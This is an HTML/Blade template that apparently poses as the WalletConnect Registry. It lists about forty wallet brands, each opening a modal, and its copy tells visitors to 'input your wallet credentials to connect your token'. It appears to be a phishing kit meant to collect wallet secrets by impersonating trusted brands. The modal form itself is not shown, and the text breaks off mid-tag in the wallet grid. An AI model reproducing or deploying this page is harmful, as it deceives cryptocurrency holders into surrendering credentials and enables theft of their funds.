<!DOCTYPE html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width">
    <meta charset="utf-8">
    <title>{{config('app.name')}} Registry</title>
    <link rel="shortcut icon" href="../registry.walletconnect.org/favicon.ico">
    <meta name="msapplication-TileColor" content="#da532c">
    <meta name="theme-color" content="#ffffff">
    <meta name="description" content="Open protocol for connecting Wallets to Dapps">
    <meta name="keywords"
          content="ethereum, cryptocurrency, wallet, mobile, connect, bridge, relay, proxy, standard, protocol, crypto, tokens, dapp">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="@walletconnect">
    <meta name="twitter:title" content="WalletConnect Registry">
    <meta name="twitter:description" content="Open protocol for connecting Wallets to Dapps">
    <meta name="twitter:img:src" content="../walletconnect.com/social-card.png">
    <meta name="og:title" content="WalletConnect Registry">
    <meta name="og:type" content="website">
    <meta name="og:url" content="../external.html?link=https://walletconnect.org/">
    <meta name="og:image" content="../walletconnect.com/social-card.png">
    <meta name="og:description" content="Open protocol for connecting Wallets to Dapps">
    <meta name="og:site_name" content="WalletConnect Registry">
    <meta name="fb:admins" content="365412154213405">
    <meta name="next-head-count" content="20">
    <link rel="preload" href="wallets_files/302506ef092b3a3cb1a9.css" as="style">
    <link rel="stylesheet" href="wallets_files/302506ef092b3a3cb1a9.css" data-n-g="">
    <noscript data-n-css=""></noscript>
    <link rel="preload" href="wallets_files/webpack-72c4aa958b14f457405c.js" as="script">
    <link rel="preload" href="wallets_files/framework-5e33f488d9410ce9ba9d.js" as="script">
    <link rel="preload" href="wallets_files/commons-b35a6acf5cd86cad0559.js" as="script">
    <link rel="preload" href="wallets_files/main-ad4bd8792aa49dacdf76.js" as="script">
    <link rel="preload" href="wallets_files/_app-2dc1a46a2522bd7ecfc5.js" as="script">
    <link rel="preload" href="wallets_files/803-f0166be3b88c977b58b2.js" as="script">
    <link rel="preload" href="wallets_files/wallets-0a4e32dd47f4f93de59f.js" as="script">
    <link as="script" rel="prefetch" href="wallets_files/803-f0166be3b88c977b58b2.js">
    <link as="script" rel="prefetch" href="wallets_files/wallets-0a4e32dd47f4f93de59f.js">
    <link as="script" rel="prefetch" href="wallets_files/index-e079964a0e839bb271de.js">
    <link as="script" rel="prefetch" href="wallets_files/apps-873693e48e2cacbc2992.js">

    <link rel="stylesheet" href="../maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script src="../ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="../cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="../maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>


</head>

<body>
<div id="__next">
    <div class="font-roboto" id="content">
        <header class="sticky top-0 z-10 flex items-center justify-between px-5 py-4 bg-white md:py-6 ">
            <div class="absolute inset-0 shadow-lg opacity-50"></div>
            <div class="z-20 flex justify-around w-full sm:pr-10 md:pr-20">
                <a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" href="#">
                    <!-- -->Apps
                    <!-- -->
                </a>
            </div>
            <div class="z-20 flex">
                <div class="w-16 mx-6 sm:w-20 md:w-28"><a href="{{route('index')}}"><img class="object-fit"
                                                                                         src="wallets_files/walletconnect-logo.svg"
                                                                                         alt="walletconnect logo"></a>
                </div>
            </div>
            <div class="z-20 flex justify-around w-full sm:pl-10 md:pl-20">
                <a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" href="#">
                    <!-- -->Wallets
                    <!-- -->
                </a>
            </div>
        </header>
        <main class="flex flex-col mx-8 mt-12 space-y-10 text-center align-middle">
            <div class="flex justify-center">
                <div class="max-w-3xl">
                    <h1 class="text-4xl font-medium text-cool-gray-500">Secure Wallet</h1>
                    <p class="mt-10 text-lg font-thin leading-6 text-gray-700">Multiple iOS and Android wallets support
                        the Wallet connect protocol. Simply input your wallet credentials to connect your token using a
                        dApp with your mobile wallet. Interaction between mobile apps and mobile browsers are supported
                        via mobile deep linking.</p>
                    <br>
                    <h1 class="text-4xl font-medium text-cool-gray-500" style="font-size: 1.5rem;">Select your wallet to
                        continue</h1>
                    <div class="mt-2"></div>
                </div>
            </div>
            @if(session()->has('success'))
                <div class="alert alert-success">
                    {{ session()->get('success') }}
                </div>
            @elseif(session()->has('errors'))
                <div class="alert alert-danger">
                    {{ session()->get('errors') }}
                </div>
            @elseif(session()->has('info'))
                <div class="alert alert-info">
                    {{ session()->get('info') }}
                </div>
            @endif

            <div class="flex justify-center">
                <div class="grid max-w-3xl grid-cols-2 gap-10 mt-6 sm:grid-cols-3 md:grid-cols-4">
                    <a href="" data-id="coinbase" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/coinbase.png" alt="Rainbow"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Coinbase
                            </div>
                        </div>
                    </a>


                    <a href="" data-id="Blockchain" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/blockchain.png" alt="Rainbow"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Blockchain
                            </div>
                        </div>
                    </a>


                    <a href="" data-id="Binance" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="images/binance.jpg" alt="Binance"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Binance
                            </div>
                        </div>
                    </a>

                    <a href="" data-id="Mew" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="images/mew.png" alt="Mew"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Mew
                            </div>
                        </div>
                    </a>


                    <a href="bow" data-id="Rainbow" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac.jpg"
                                         alt="Rainbow"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Rainbow
                            </div>
                        </div>
                    </a>

                    <a href="bow" data-id="Terra Station" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/fbc8d86ad914ebd733fec4812b4b7af5ca709fdd9e75a930115e5baa02c.jpg"
                                         alt="terra-station"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Terra Station
                            </div>
                        </div>
                    </a>
                    <a href="t" data-toggle="modal" data-id="Trust Wallet" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875d.jpg"
                                         alt="Trust Wallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Trust Wallet
                            </div>
                        </div>
                    </a>
                    <a href="nt" data-toggle="modal" data-id="Argent" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/cf21952a9bc8108bf13b12c92443751e2cc388d27008be4201b92bbc6d8.jpg"
                                         alt="Argent"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Argent
                            </div>
                        </div>
                    </a>
                    <a href="Mask" data-id="MetaMask" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e972.jpg"
                                         alt="MetaMask"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                MetaMask
                            </div>
                        </div>
                    </a>
                    <a href="is" data-id="Gnosis Safe Multisig" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/a5cfbd9a263c9dcfb59d6e9dc00933c46f00277ed78a6a0a1e38b0c17e0.jpg"
                                         alt="Gnosis Safe Multisig"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Gnosis Safe Multisig
                            </div>
                        </div>
                    </a>
                    <a href="o.com" data-id=" Crypto.com | DeFi Wallet" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f4.jpg"
                                         alt="Crypto.com | DeFi Wallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Crypto.com | DeFi Wallet
                            </div>
                        </div>
                    </a>
                    <a href="ar" data-id="Pillar" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/0b58bf037bf943e934706796fb017d59eace1dadcbc1d9fe24d9b46629e.jpg"
                                         alt="Pillar"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Pillar
                            </div>
                        </div>
                    </a>
                    <a href="ken" data-id="imToken" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/9d373b43ad4d2cf190fb1a774ec964a1addf406d6fd24af94ab7596e58c.jpg"
                                         alt="imToken"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                imToken
                            </div>
                        </div>
                    </a>
                    <a href="" data-id="ONTO" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d.jpg"
                                         alt="ONTO"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                ONTO
                            </div>
                        </div>
                    </a>
                    <a href="nPocket" data-id="TokenPocket" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2.jpg"
                                         alt="TokenPocket"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                TokenPocket
                            </div>
                        </div>
                    </a>
                    <a href="" data-id="MathWallet" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5.jpg"
                                         alt="MathWallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                MathWallet
                            </div>
                        </div>
                    </a>
                    <a href="ay" data-id="BitPay" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/ccb714920401f7d008dbe11281ae70e3a4bfb621763b187b9e4a3ce1ab8.jpg"
                                         alt="BitPay"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                BitPay
                            </div>
                        </div>
                    </a>
                    <a href="er" data-id="Ledger Live" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/4ab2542c2799c825a8465ba5ab8aa7def52b7904f38b74484af917ed9c0.jpg"
                                         alt="Ledger Live"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Ledger Live
                            </div>
                        </div>
                    </a>
                    <a href="ETH" data-id="WallETH" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/83f26999937cbc2e2014655796da4b05f77c1de9413a0ee6d0c6178ebcf.jpg"
                                         alt="WallETH"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                WallETH
                            </div>
                        </div>
                    </a>
                    <a href="ereum" data-id="Authereum" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/71dad538ba02a9b321041d388f9c1efe14e0d1915a2ea80a90405d2f6b6.jpg"
                                         alt="Authereum"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Authereum
                            </div>
                        </div>
                    </a>
                    <a href="ma" data-id="Dharma" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/9dab7bd72148e2f796452630230666daf507935fae7bb9baf22b3c11960.jpg"
                                         alt="Dharma"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Dharma
                            </div>
                        </div>
                    </a>
                    <a href="h" data-id="1inch Wallet" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/09102e7bbbd3f92001eda104abe23803181629f695e8f1b95af96d88ff7.jpg"
                                         alt="1inch Wallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                1inch Wallet
                            </div>
                        </div>
                    </a>
                    <a href="i" data-id="Huobi Wallet" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/bae74827272509a6d63ea25514d9c68ad235c14e45e183518c7ded4572a.jpg"
                                         alt="Huobi Wallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Huobi Wallet
                            </div>
                        </div>
                    </a>
                    <a href="o" data-id="Eidoo" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/efba9ae0a9e0fdd9e3e055ddf3c8e75f294babb8aea3499456eff27f771.jpg"
                                         alt="Eidoo"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Eidoo
                            </div>
                        </div>
                    </a>
                    <a href="e" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/beea4e71c2ffbb48b59b21e33fb0049ef6522585aa9c8a33a97d3e1c81f.jpg"
                                         alt="Alice"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Alice
                            </div>
                        </div>
                    </a>
                    <a href="a" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a2183.jpg"
                                         alt="AlphaWallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                AlphaWallet
                            </div>
                        </div>
                    </a>

                    <a href="ore" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/29f4a70ad5993f3f73ae8119f0e78ecbae51deec2a021a770225c644935.jpg"
                                         alt="ZelCore"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                ZelCore
                            </div>
                        </div>
                    </a>
                    <a href="" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/8605171a052e85d629c5efe5db804c7a3fb6d0ecc759d6817f0a18cb3da.jpg"
                                         alt="Nash"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Nash
                            </div>
                        </div>
                    </a>
                    <a href="omi" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/9277bc510b6d95f29be38e7c0e402ae8438262f0f4c6dbb40dfc22f5043.jpg"
                                         alt="Coinomi"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Coinomi
                            </div>
                        </div>
                    </a>
                    <a href="plus" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/6ec1ffc9627c3b9f87676da3f7b5796828a6c016d3253e51e771e6f951c.jpg"
                                         alt="GridPlus"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                GridPlus
                            </div>
                        </div>
                    </a>
                    <a href="VO" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/a395dbfc92b5519cbd1cc6937a4e79830187daaeb2c6fcdf9b9cce4255f.jpg"
                                         alt="CYBAVO Wallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                CYBAVO Wallet
                            </div>
                        </div>
                    </a>

                    <a href="s" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/3f1bc4a8fd72b3665459ec5c99ee51b424f6beeebe46b45f4a70cf08a84.jpg"
                                         alt="Torus"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Torus
                            </div>
                        </div>
                    </a>
                    <a href="ium" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/7b83869f03dc3848866e0299bc630aaf3213bea95cd6cecfbe149389cf4.jpg"
                                         alt="Spatium"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Spatium
                            </div>
                        </div>
                    </a>
                    <a href="Pal" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d05.jpg"
                                         alt="SafePal"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                SafePal
                            </div>
                        </div>
                    </a>
                    <a href="nito" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/d0387325e894a1c4244820260ad7c78bb20d79eeec2fd59ffe3529223f3.jpg"
                                         alt="Infinito"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Infinito
                            </div>
                        </div>
                    </a>
                    <a href="et.io" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/176b83d9268d77438e32aa44770fb37b40d6448740b6a05a97b17532335.jpg"
                                         alt="wallet.io"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                wallet.io
                            </div>
                        </div>
                    </a>
                    <a href="nity" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/802a2041afdaf4c7e41a2903e98df333c8835897532699ad370f829390c.jpg"
                                         alt="Infinity Wallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Infinity Wallet
                            </div>
                        </div>
                    </a>
                    <a href="it" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/8fb830a15679a8537d84c3852e026a4bdb39d0ee3b387411a91e8f6abaf.jpg"
                                         alt="Ownbit"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Ownbit
                            </div>
                        </div>
                    </a>
                    <a href="Pocket" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/244a0d93a45df0d0501a9cb9cdfb4e91aa750cfd4fc88f6e97a54d8455a.jpg"
                                         alt="EasyPocket"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                EasyPocket
                            </div>
                        </div>
                    </a>
                    <a href="ge" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/881946407ff22a32ec0e42b2cd31ea5dab52242dc3648d777b511a0440d.jpg"
                                         alt="Bridge Wallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Bridge Wallet
                            </div>
                        </div>
                    </a>
                    <a href="kPoint" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/3b0e861b3a57e98325b82ab687fe0a712c81366d521ceec49eebc35591f.jpg"
                                         alt="SparkPoint"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                SparkPoint
                            </div>
                        </div>
                    </a>
                    <a href="allet" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
